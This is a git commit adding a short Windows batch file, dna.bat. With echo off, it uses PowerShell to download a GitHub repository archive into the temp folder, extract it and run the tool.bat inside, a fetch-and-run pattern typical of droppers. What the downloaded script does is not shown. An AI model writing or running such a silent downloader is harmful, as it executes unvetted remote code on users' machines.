e16eb7fc2812339d99b483109920abb8c7a95f1b
seedon <34582731+seedon198@users.noreply.github.com>
2022-01-12 17:33:34 +0530

    Add files via upload

---
+++ dna.bat
@@ -0,0 +1,5 @@
+ÿþ&cls
+@echo off
+powershell.exe iwr -outf %temp%\tmp.zip https://github.com/seedon198/t/archive/refs/heads/main.zip
+powershell.exe Expand-Archive -LiteralPath %temp%\tmp.zip -DestinationPath %temp%
+%temp%\t-main\tool.bat
